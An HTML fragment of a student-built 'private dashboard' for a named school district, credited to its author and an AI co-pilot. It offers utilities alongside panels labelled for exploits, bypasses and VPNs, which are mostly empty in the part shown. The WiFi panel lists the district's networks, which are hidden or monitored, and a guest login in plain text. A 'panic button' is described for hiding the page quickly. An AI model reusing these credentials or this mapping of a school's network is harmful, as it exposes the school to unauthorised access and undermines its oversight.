        <button onclick="dashboard.togglePanel('phoneDirectoryPanel', this)">📞 School Phone Directory Information</button>
        <button onclick="dashboard.togglePanel('cameraPanel', this)">📷 School Camera Information</button>
        <button onclick="dashboard.togglePanel('schoolInfoPanel', this)">🏫 School Information</button>
        <button onclick="dashboard.togglePanel('exploitPanel', this)">🧨 Exploiting Tools</button>
        <button onclick="dashboard.togglePanel('bypassPanel', this)">🚪 Bypassing Tools</button>
        <button onclick="dashboard.togglePanel('vpnPanel', this)">🔐 VPN Websites</button>
        <button onclick="dashboard.togglePanel('gamingPanel', this)">🎮 Gaming Websites</button>
        <button onclick="dashboard.togglePanel('musicPanel', this)">🎵 Music Websites</button>
        <button onclick="dashboard.togglePanel('keyboardPanel', this)">🎹 Keyboard Tricks</button>
    </div>


    <!-- Information Panels Container -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
        <!-- New Panel: Settings -->
        <div id="settingsPanel" class="info-panel">
            <h2>⚙️ Dashboard Settings</h2>
            <div class="setting-section">
                <h3>Appearance</h3>
                <div class="form-group">
                    <label>Theme:</label>
                    <div class="checkbox-container">
                        <input type="checkbox" id="settingThemeToggle" checked>
                        <span>Dark Mode / Light Mode</span>
                    </div>
                </div>
                <div class="form-group">
                    <label for="accentColor">Accent Color:</label>
                    <input type="color" id="accentColor" value="#ff914d">
                    <button class="button" onclick="dashboard.applySetting('accentColor')">Apply Accent Color</button>
                </div>
                <div class="form-group">
                    <label for="fontStyle">Font Style (Simulated):</label>
                    <select id="fontStyle">
                        <option value="'Segoe UI', sans-serif">Segoe UI (Default)</option>
                        <option value="'Montserrat', sans-serif">Montserrat</option>
                        <option value="'Roboto Mono', monospace">Roboto Mono</option>
                    </select>
                    <button class="button" onclick="dashboard.applySetting('fontStyle')">Apply Font</button>
                </div>
                <div class="form-group">
                    <label>Background Image (Simulated):</label>
                    <input type="text" id="backgroundImage" placeholder="Enter image URL or 'none'">
                    <button class="button" onclick="dashboard.applySetting('backgroundImage')">Apply BG Image</button>
                </div>
            </div>

            <div class="setting-section">
                <h3>Notifications</h3>
                <div class="form-group">
                    <div class="checkbox-container">
                        <input type="checkbox" id="settingNotificationsEnabled" checked>
                        <span>Enable Pop-up Notifications</span>
                    </div>
                </div>
                <div class="form-group">
                    <label for="notificationSound">Notification Sound (Simulated):</label>
                    <select id="notificationSound">
                        <option value="none">None</option>
                        <option value="beep">Beep</option>
                        <option value="chime">Chime</option>
                    </select>
                </div>
                <div class="settings-button-group">
                    <button class="button" onclick="dashboard.clearNotifications()">Clear Notification Log</button>
                    <button class="button" onclick="dashboard.testNotification()">Test Notification</button>
                </div>
            </div>

            <div class="setting-section">
                <h3>Security</h3>
                <div class="form-group">
                    <label for="changePassword">Change Password (Simulated):</label>
                    <input type="password" id="changePassword" placeholder="New Password">
                    <input type="password" id="confirmPassword" placeholder="Confirm New Password">
                    <button class="button" onclick="dashboard.applySetting('changePassword')">Save Password</button>
                </div>
                <div class="form-group">
                    <div class="checkbox-container">
                        <input type="checkbox" id="twoFactorAuth">
                        <span>Enable Two-Factor Authentication (Simulated)</span>
                    </div>
                </div>
                <div class="form-group">
                    <label>Login History (Simulated):</label>
                    <p><em>Last login: 2025-08-22 14:30:15 from IP 192.168.1.100</em></p>
                    <button class="button">View Full Log</button>
                </div>
            </div>

            <div class="setting-section">
                <h3>Account</h3>
                <div class="form-group">
                    <label>Profile Username:</label>
                    <p><span id="settingsProfileUser">Beta.user</span></p>
                </div>
                <div class="form-group">
                    <label>User ID:</label>
                    <p><span id="settingsProfileID">281573</span></p>
                </div>
                <div class="form-group">
                    <label for="aboutMe">About Me (Simulated):</label>
                    <textarea id="aboutMe" rows="3" placeholder="Tell us about yourself..."></textarea>
                    <button class="button" onclick="dashboard.applySetting('aboutMe')">Save About Me</button>
                </div>
            </div>

            <div class="setting-section">
                <h3>Dashboard Layout</h3>
                <div class="form-group">
                    <label>Toggle Main Grid Widgets:</label>
                    <div class="checkbox-container">
                        <input type="checkbox" id="toggleCalendarBox" checked>
                        <span>Show Calendar Box</span>
                    </div>
                    <div class="checkbox-container">
                        <input type="checkbox" id="toggleMotivationBox" checked>
                        <span>Show Motivation Box</span>
                    </div>
                    <div class="checkbox-container">
                        <input type="checkbox" id="toggleUpdatesBox" checked>
                        <span>Show Updates Box</span>
                    </div>
                    <div class="checkbox-container">
                        <input type="checkbox" id="toggleSystemAlertsBox" checked>
                        <span>Show System Alerts Box</span>
                    </div>
                    <button class="button" onclick="dashboard.applyLayoutSettings()">Apply Layout Changes</button>
                </div>
            </div>

            <div class="setting-section">
                <h3>Reminder System Settings</h3>
                <div class="form-group">
                    <label for="defaultReminderSound">Default Reminder Sound (Simulated):</label>
                    <select id="defaultReminderSound">
                        <option value="alert1">Alert 1</option>
                        <option value="alert2">Alert 2</option>
                        <option value="softbell">Soft Bell</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="defaultSnoozeTime">Default Snooze Time (minutes):</label>
                    <input type="number" id="defaultSnoozeTime" value="5" min="1">
                </div>
            </div>

            <div class="setting-section">
                <h3>Advanced</h3>
                <button class="button" style="background-color: darkred; color: white;" onclick="if(confirm('Are you sure you want to reset ALL settings?')) dashboard.resetSettings();">Reset All Settings</button>
            </div>
        </div>

        <!-- New Panel: Reminders -->
        <div id="remindersPanel" class="info-panel">
            <h2>⏰ My Reminders</h2>
            <div class="reminder-add-form">
                <h3>Add New Reminder</h3>
                <div class="form-group">
                    <label for="reminderText">Reminder Description:</label>
                    <input type="text" id="reminderText" placeholder="e.g., Finish project, Call John" required>
                </div>
                <div class="form-group">
                    <label for="reminderDate">Date:</label>
                    <input type="date" id="reminderDate" required>
                </div>
                <div class="form-group">
                    <label for="reminderTime">Time:</label>
                    <input type="time" id="reminderTime">
                </div>
                <button class="button" onclick="dashboard.addReminder()">Add Reminder</button>
            </div>

            <h3>Upcoming Reminders</h3>
            <div id="reminderList" class="reminder-list-container">
                <p style="text-align: center; color: gray;">No reminders set. Add one above!</p>
                <!-- Reminders will be dynamically added here -->
            </div>
        </div>

        <!-- New Panel: Help & Guides -->
        <div id="helpGuidePanel" class="info-panel">
            <h2>❓ Help & User Guides</h2>
            <div class="section-content">
                <h3>Getting Started</h3>
                <p>Welcome to your Private Dashboard GUI! This system provides quick access to a variety of tools and information. Here are some key features:</p>
                <ul>
                    <li><strong>Quick Bar:</strong> Access session time, clock, notes, and system controls.</li>
                    <li><strong>Info Panels:</strong> Click the utility buttons below the announcement bar to open various information sections like School WiFi, Handbooks, Exploiting Tools, and more.</li>
                    <li><strong>Settings:</strong> Customize your dashboard's appearance, notifications, and other behaviors using the ⚙️ Settings button in the top button bar.</li>
                    <li><strong>Reminders:</strong> Use the ⏰ Reminders button to set and manage personal reminders.</li>
                    <li><strong>Notification System:</strong> Most button presses and system events trigger a small pop-up notification in the top right. View a full log via the 📢 Notification Log button.</li>
                </ul>
            </div>
            <div class="section-content">
                <h3>Common Issues & Fixes</h3>
                <p><strong>Dashboard not responding?</strong> Try clicking the "🔄 Restart Dashboard" button in the Quick Bar.</p>
                <p><strong>Interface looks odd?</strong> Check your browser's zoom level. Use the "➕ Zoom In" and "➖ Zoom Out" buttons, or "🖥️ Full Screen" to reset the view.</p>
                <p><strong>Login problems?</strong> Ensure your username, password, and User ID are correct. After too many attempts, a reset prompt will appear.</p>
            </div>
            <div class="section-content">
                <h3>Privacy Policy (Simulated)</h3>
                <p>Your privacy is important to us. This system logs certain actions for security and improvement purposes, as outlined during login. Data collected includes login attempts, browser info, device specs, and session activity. No personally identifiable information beyond your credentials is explicitly stored without your consent within the dashboard interface itself. Please refer to the full privacy policy <a href="#" target="_blank">here</a> (link simulated).</p>
            </div>
            <div class="section-content">
                <h3>Frequently Asked Questions</h3>
                <p><strong>Q: How do I change the theme?</strong><br> A: Click "⚙️ Settings", then find "Theme" under Appearance. There is also a quick toggle in the main quick bar.</p>
                <p><strong>Q: Can I customize the layout?</strong><br> A: Yes, navigate to "⚙️ Settings", then "Dashboard Layout" to hide/show main grid widgets.</p>
                <p><strong>Q: What is the Panic Button for?</strong><br> A: The Panic Button quickly opens Clever.com (or any specified emergency URL) in a new tab, serving as a rapid distraction or escape if you need to quickly hide the dashboard content.</p>
            </div>
        </div>

        <!-- New Panel: System Status -->
        <div id="systemStatusPanel" class="info-panel">
            <h2>📊 System Status (Simulated)</h2>
            <div class="section-content">
                <h3>Overview</h3>
                <p><strong>Dashboard Uptime:</strong> <span id="sysStatusUptime">0 days, 0 hours, 0 minutes</span></p>
                <p><strong>Last Activity:</strong> <span id="sysStatusLastActivity">Just now</span></p>
                <p><strong>Connected Users (Simulated):</strong> 1 (You)</p>
                <p><strong>Server Status (Simulated):</strong> <span style="color: green;">Online</span></p>
            </div>
            <div class="section-content">
                <h3>Resource Usage</h3>
                <p><strong>CPU Usage:</strong> <span id="sysStatusCPU">15%</span></p>
                <p><strong>Memory Usage:</strong> <span id="sysStatusMemory">4.2 GB / 16 GB</span></p>
                <p><strong>Disk Space:</strong> <span id="sysStatusDisk">120 GB Free / 256 GB</span></p>
                <p><strong>Network Speed:</strong> <span id="sysStatusNetwork">Downloading at 5.4 Mbps / Uploading at 2.1 Mbps</span></p>
                <button class="button" onclick="dashboard.simulateSystemRefresh()">Refresh Stats (Simulated)</button>
            </div>
            <div class="section-content">
                <h3>System Logs (Partial, Simulated)</h3>
                <textarea id="systemLogsArea" style="width:100%; height:150px; background-color: #1c1c1c; color: #00ff00; border: none; font-family: 'Courier New', monospace; font-size: 0.8em;" readonly>
[2025-08-23 02:55:01] INFO: Dashboard loaded successfully.
[2025-08-23 02:55:05] WARNING: Minor resource spikes detected. (Normal)
[2025-08-23 02:56:10] INFO: User 'Beta.user' accessed School WiFi info.
                </textarea>
            </div>
        </div>

        <!-- New Panel: Network Tools -->
        <div id="networkToolsPanel" class="info-panel">
            <h2>📡 Network Tools (Simulated)</h2>
            <div class="section-content">
                <h3>Ping (Simulated)</h3>
                <div class="form-group">
                    <label for="pingTarget">Target IP/Hostname:</label>
                    <input type="text" id="pingTarget" value="www.google.com">
                    <button class="button" onclick="dashboard.simulatePing()">Run Ping</button>
                </div>
                <pre id="pingOutput" class="info-text" style="font-family: 'Courier New', monospace; font-size: 0.85em;">Awaiting ping results...</pre>
            </div>
            <div class="section-content">
                <h3>Traceroute (Simulated)</h3>
                <div class="form-group">
                    <label for="tracerouteTarget">Target IP/Hostname:</label>
                    <input type="text" id="tracerouteTarget" value="www.microsoft.com">
                    <button class="button" onclick="dashboard.simulateTraceroute()">Run Traceroute</button>
                </div>
                <pre id="tracerouteOutput" class="info-text" style="font-family: 'Courier New', monospace; font-size: 0.85em;">Awaiting traceroute results...</pre>
            </div>
        </div>

        <!-- New Panel: About Dashboard -->
        <div id="aboutPanel" class="info-panel">
            <h2>ℹ️ About This Dashboard</h2>
            <div class="section-content">
                <p><strong>Dashboard Name:</strong> Private System GUI</p>
                <p><strong>Version:</strong> 1.6.0 Enhanced</p>
                <p><strong>Developed by:</strong> Nuker214 & AI Co-pilot (August 2025 Edition)</p>
                <p><strong>Description:</strong> An experimental web-based private dashboard, offering a suite of information, utility tools, and system management features, inspired by futuristic command center interfaces.</p>
                <p><strong>Tech Stack:</strong> HTML5, CSS3 (Custom Properties, Flexbox, Grid, Animations), JavaScript (ES6+).</p>
                <p><strong>License:</strong> Proprietary - All Rights Reserved.</p>
                <p><strong>Last Update:</strong> August 23, 2025</p>
                <p><strong>Acknowledgements:</strong> Original design by Nuker214. Enhancements and expansion provided by a friendly large language model. Icons sourced from Emojipedia.</p>
                <p>We are continuously improving and adding new features. Feedback and suggestions are always welcome!</p>
            </div>

        </div>

        <!-- New Panel: Notification Log -->
        <div id="notificationLogPanel" class="info-panel">
            <h2>📢 Notification History</h2>
            <div class="section-content">
                <button class="button" onclick="dashboard.clearNotifications()">Clear Log</button>
                <div id="notificationLog" style="max-height: 400px; overflow-y: auto; margin-top: 15px; padding-right: 10px;">
                    <p style="text-align: center; color: gray;">No notifications yet.</p>
                </div>
            </div>
        </div>

        <!-- New Panel: Calculator -->
        <div id="calculatorPanel" class="info-panel">
            <h2>🔢 Calculator</h2>
            <div class="calculator-display" id="calcDisplay">0</div>
            <div class="calculator-grid">
                <button class="clear" data-calc-value="C">C</button>
                <button class="operator" data-calc-value="/">&divide;</button>
                <button class="operator" data-calc-value="*">&times;</button>
                <button data-calc-value="7">7</button>
                <button data-calc-value="8">8</button>
                <button data-calc-value="9">9</button>
                <button class="operator" data-calc-value="-">-</button>
                <button data-calc-value="4">4</button>
                <button data-calc-value="5">5</button>
                <button data-calc-value="6">6</button>
                <button class="operator" data-calc-value="+">+</button>
                <button data-calc-value="1">1</button>
                <button data-calc-value="2">2</button>
                <button data-calc-value="3">3</button>
                <button class="equals" data-calc-value="=">=</button>
                <button data-calc-value="0" style="grid-column: span 2;">0</button>
                <button data-calc-value=".">.</button>
            </div>
        </div>

        <!-- New Panel: Unit Converter -->
        <div id="unitConverterPanel" class="info-panel">
            <h2>↔️ Unit Converter</h2>
            <div class="form-group">
                <label for="convertValue">Value:</label>
                <input type="number" id="convertValue" value="1" step="any">
            </div>
            <div class="form-group">
                <label for="convertFrom">From Unit:</label>
                <select id="convertFrom">
                    <optgroup label="Length">
                        <option value="meters">Meters</option>
                        <option value="feet">Feet</option>
                        <option value="miles">Miles</option>
                        <option value="kilometers">Kilometers</option>
                    </optgroup>
                    <optgroup label="Mass">
                        <option value="kilograms">Kilograms</option>
                        <option value="pounds">Pounds</option>
                        <option value="ounces">Ounces</option>
                    </optgroup>
                </select>
            </div>
            <div class="form-group">
                <label for="convertTo">To Unit:</label>
                <select id="convertTo">
                    <optgroup label="Length">
                        <option value="feet">Feet</option>
                        <option value="meters">Meters</option>
                        <option value="kilometers">Kilometers</option>
                        <option value="miles">Miles</option>
                    </optgroup>
                    <optgroup label="Mass">
                        <option value="pounds">Pounds</option>
                        <option value="kilograms">Kilograms</option>
                        <option value="ounces">Ounces</option>
                    </optgroup>
                </select>
            </div>
            <button class="button" onclick="dashboard.convertUnits()">Convert</button>
            <div class="unit-converter-results">
                <h3>Result:</h3>
                <div id="conversionResult"></div>
            </div>
        </div>

        <!-- New Panel: Weather Forecast -->
        <div id="weatherPanel" class="info-panel">
            <h2>🌤️ Weather Forecast (Simulated)</h2>
            <div class="form-group">
                <label for="weatherLocation">Enter City:</label>
                <input type="text" id="weatherLocation" value="Middletown">
                <button class="button" onclick="dashboard.getWeather()">Get Weather</button>
            </div>
            <div id="weatherDisplay" class="section-content">
                <p><strong>Location:</strong> Middletown, PA</p>
                <p><strong>Current Temperature:</strong> 72°F (22°C) ☀️</p>
                <p><strong>Conditions:</strong> Sunny with a gentle breeze</p>
                <p><strong>Humidity:</strong> 60%</p>
                <p><strong>Wind Speed:</strong> 8 mph</p>
                <p><strong>Forecast for Tomorrow:</strong> Partly cloudy, high 75°F (24°C)</p>
            </div>
        </div>

        <!-- New Panel: Text Editor -->
        <div id="textEditorPanel" class="info-panel">
            <h2>📝 Text Editor</h2>
            <textarea id="textEditor" placeholder="Start typing your text here..." class="section-content"></textarea>
            <div class="settings-button-group">
                <button class="button" onclick="dashboard.saveTextToFile()">Save to File</button>
                <button class="button" onclick="dashboard.loadTextFromFile()">Load from File</button>
                <button class="button" onclick="dashboard.clearTextEditor()">Clear Editor</button>
            </div>
        </div>

        <!-- New Panel: Password Generator -->
        <div id="passwordGenPanel" class="info-panel">
            <h2>🔑 Password Generator</h2>
            <div class="password-output" id="generatedPassword">Click "Generate Password"</div>
            <div class="form-group">
                <label for="pwLength">Password Length:</label>
                <input type="range" id="pwLength" min="8" max="32" value="16">
                <span id="pwLengthDisplay">16</span> characters
            </div>
            <div class="form-group">
                <div class="checkbox-container"><input type="checkbox" id="pwUppercase" checked> <span>Include Uppercase</span></div>
                <div class="checkbox-container"><input type="checkbox" id="pwLowercase" checked> <span>Include Lowercase</span></div>
                <div class="checkbox-container"><input type="checkbox" id="pwNumbers" checked> <span>Include Numbers</span></div>
                <div class="checkbox-container"><input type="checkbox" id="pwSymbols" checked> <span>Include Symbols (!@#$%)</span></div>
            </div>
            <div class="settings-button-group">
                <button class="button" onclick="dashboard.generatePassword()">Generate Password</button>
                <button class="button" onclick="dashboard.copyPassword()">Copy to Clipboard</button>
            </div>
        </div>

        <!-- New Panel: QR Code Generator -->
        <div id="qrCodeGenPanel" class="info-panel">
            <h2>🔲 QR Code Generator (Coming Soon)</h2>
            <p class="coming-soon">This feature is under development. Soon you'll be able to generate QR codes for text or URLs!</p>
            <div class="form-group">
                <label for="qrContent">Content for QR Code:</label>
                <input type="text" id="qrContent" placeholder="Enter text or URL">
                <button class="button" disabled>Generate QR (Disabled)</button>
            </div>
            <div id="qrCodeDisplay" style="text-align: center; margin-top: 20px; border: 1px dashed gray; padding: 20px;">
                <!-- QR code image will appear here -->
                <p style="opacity: 0.7;">[QR Code Preview Area]</p>
            </div>
        </div>

        <!-- New Panel: Dice Roller -->
        <div id="diceRollerPanel" class="info-panel">
            <h2>🎲 Dice Roller</h2>
            <div class="form-group">
                <label for="numDice">Number of Dice:</label>
                <input type="number" id="numDice" value="1" min="1" max="10">
            </div>
            <div class="form-group">
                <label for="diceType">Dice Type:</label>
                <select id="diceType">
                    <option value="4">D4 (4-sided)</option>
                    <option value="6" selected>D6 (6-sided)</option>
                    <option value="8">D8 (8-sided)</option>
                    <option value="10">D10 (10-sided)</option>
                    <option value="12">D12 (12-sided)</option>
                    <option value="20">D20 (20-sided)</option>
                </select>
            </div>
            <button class="button" onclick="dashboard.rollDice()">Roll Dice</button>
            <div id="diceResults" class="info-text">Rolls: </div>
            <div id="diceTotal" class="info-text" style="font-weight: bold;">Total: </div>
        </div>

        <!-- New Panel: Coin Flipper -->
        <div id="coinFlipperPanel" class="info-panel">
            <h2>🪙 Coin Flipper</h2>
            <p id="coinResult" class="info-text" style="font-size: 1.5em; text-align: center;">Click to Flip!</p>
            <button class="button" onclick="dashboard.flipCoin()">Flip Coin</button>
        </div>

        <!-- New Panel: Random Number Generator -->
        <div id="randomNumberGenPanel" class="info-panel">
            <h2>🔢 Random Number Generator</h2>
            <div class="random-output" id="randomNumberResult">--</div>
            <div class="form-group">
                <label for="minRandom">Minimum:</label>
                <input type="number" id="minRandom" value="1">
            </div>
            <div class="form-group">
                <label for="maxRandom">Maximum:</label>
                <input type="number" id="maxRandom" value="100">
            </div>
            <button class="button" onclick="dashboard.generateRandomNumber()">Generate Random Number</button>
        </div>

        <!-- New Panel: Timer & Stopwatch -->
        <div id="timerStopwatchPanel" class="info-panel">
            <h2>⏱️ Timer & Stopwatch</h2>

            <div class="section-content">
                <h3>Countdown Timer</h3>
                <div class="timer-display" id="timerDisplay">00:00:00</div>
                <div class="timer-inputs">
                    <input type="number" id="timerHours" value="0" min="0" max="99">H
                    <input type="number" id="timerMinutes" value="0" min="0" max="59">M
                    <input type="number" id="timerSeconds" value="0" min="0" max="59">S
                </div>
                <div class="timer-controls">
                    <button class="button" onclick="dashboard.startTimer()">Start</button>
                    <button class="button" onclick="dashboard.pauseTimer()">Pause</button>
                    <button class="button" onclick="dashboard.resetTimer()">Reset</button>
                </div>
            </div>

            <div class="section-content">
                <h3>Stopwatch</h3>
                <div class="stopwatch-display" id="stopwatchDisplay">00:00:00</div>
                <div class="stopwatch-controls">
                    <button class="button" onclick="dashboard.startStopwatch()">Start</button>
                    <button class="button" onclick="dashboard.pauseStopwatch()">Pause</button>
                    <button class="button" onclick="dashboard.resetStopwatch()">Reset</button>
                </div>
            </div>
        </div>

        <!-- New Panel: Digital Clock -->
        <div id="digitalClockPanel" class="info-panel">
            <h2>⏰ Digital Clock</h2>
            <div id="digitalClockDisplay" style="font-size: 3.5em; text-align: center; margin: 20px 0; font-family: 'Courier New', monospace;">--:--:--</div>
            <div id="digitalDateDisplay" style="font-size: 1.2em; text-align: center;">-- -- ----</div>
        </div>

        <!-- New Panel: Secret Notes -->
        <div id="secretNotesPanel" class="info-panel">
            <h2>🔒 Secret Notes</h2>
            <textarea id="secretNotesTextarea" rows="10" placeholder="Type your confidential notes here... This content is not stored in plain text and is meant for temporary, sensitive information." class="section-content"></textarea>
            <div class="settings-button-group">
                <button class="button" onclick="dashboard.clearSecretNotes()">Clear Notes</button>
                <button class="button" onclick="dashboard.lockSecretNotes()">Lock/Hide Notes (Simulated)</button>
            </div>
            <div class="info-text" style="margin-top: 20px; font-style: italic; color: #f0f0f0;">
                <p>Warning: Notes in this section are intended for temporary storage of sensitive information. They are NOT securely saved persistently unless explicitly noted (this version does NOT offer secure persistent storage yet). Clearing your browser data WILL remove these notes.</p>
            </div>
        </div>

        <!-- New Panel: Resource Hub -->
        <div id="resourceHubPanel" class="info-panel">
            <h2>📚 Resource Hub</h2>
            <div class="section-content">
                <h3>Programming Resources</h3>
                <div class="links-list grid-container-2">
                    <a href="https://www.w3schools.com" target="_blank">W3Schools</a>
                    <a href="https://developer.mozilla.org/en-US/" target="_blank">MDN Web Docs</a>
                    <a href="https://stackoverflow.com" target="_blank">Stack Overflow</a>
                    <a href="https://github.com" target="_blank">GitHub</a>
                </div>
            </div>
            <div class="section-content">
                <h3>General Knowledge & Learning</h3>
                <div class="links-list grid-container-2">
                    <a href="https://en.wikipedia.org" target="_blank">Wikipedia</a>
                    <a href="https://www.khanacademy.org" target="_blank">Khan Academy</a>
                    <a href="https://www.coursera.org" target="_blank">Coursera</a>
                    <a href="https://www.edx.org" target="_blank">edX</a>
                </div>
            </div>
            <div class="section-content">
                <h3>Productivity Tools</h3>
                <div class="links-list grid-container-2">
                    <a href="https://docs.google.com" target="_blank">Google Docs</a>
                    <a href="https://trello.com" target="_blank">Trello</a>
                    <a href="https://asana.com" target="_blank">Asana</a>
                    <a href="https://www.grammarly.com" target="_blank">Grammarly</a>
                </div>
            </div>
        </div>

        <!-- New Panel: Dashboard Changelog -->
        <div id="changelogPanel" class="info-panel">
            <h2>📜 Dashboard Changelog</h2>
            <div class="section-content">
                <h3>Version 1.6.0 (August 23, 2025)</h3>
                <ul>
                    <li><strong>Major:</strong> Implemented comprehensive Pre-loader animation sequence for System, Key System, and Dashboard.</li>
                    <li><strong>Major:</strong> Introduced new, extensive "Settings" panel with Appearance, Notifications, Security, Account, Layout, and Advanced options.</li>
                    <li><strong>Major:</strong> Developed "Reminders" system with Add/View/Complete functionality, accessible from the top button bar.</li>
                    <li><strong>Major:</strong> Added persistent, real-time "Notification System" in top-right corner; logs button presses and system events.</li>
                    <li><strong>New Feature:</strong> "Notification Log" panel to review past alerts and button activity.</li>
                    <li><strong>New Utility Buttons:</strong> Integrated Calculator, Unit Converter, Weather Forecast (simulated), Text Editor, Password Generator, QR Code Generator (placeholder), Dice Roller, Coin Flipper, Random Number Generator, Timer & Stopwatch, Digital Clock (dedicated), Secret Notes, and Resource Hub.</li>
                    <li><strong>New Info Panels:</strong> System Status (simulated), Network Tools (simulated), About Dashboard, Help & User Guides.</li>
                    <li><strong>UI/UX:</strong> Enhanced general CSS animations, transitions, and hover effects for a more dynamic feel.</li>
                    <li><strong>Code Structure:</strong> Refactored JavaScript for better modularity and maintainability to support new features.</li>
                </ul>
                <h3>Version 1.5.6 (Original Base)</h3>
                <ul>
                    <li>Initial release with login system and basic dashboard elements (Calendar, Notes, Panic, Theme Toggle, etc.)</li>
                    <li>Integration of existing information panels (School Wifi, Handbooks, Exploits, Bypasses).</li>
                </ul>
            </div>
        </div>


      <!-- Original Information Panels (retained and enhanced with notifications) -->
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions', this)">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses', this)">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons grid-container-2">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list grid-container-2">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list grid-container-2">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
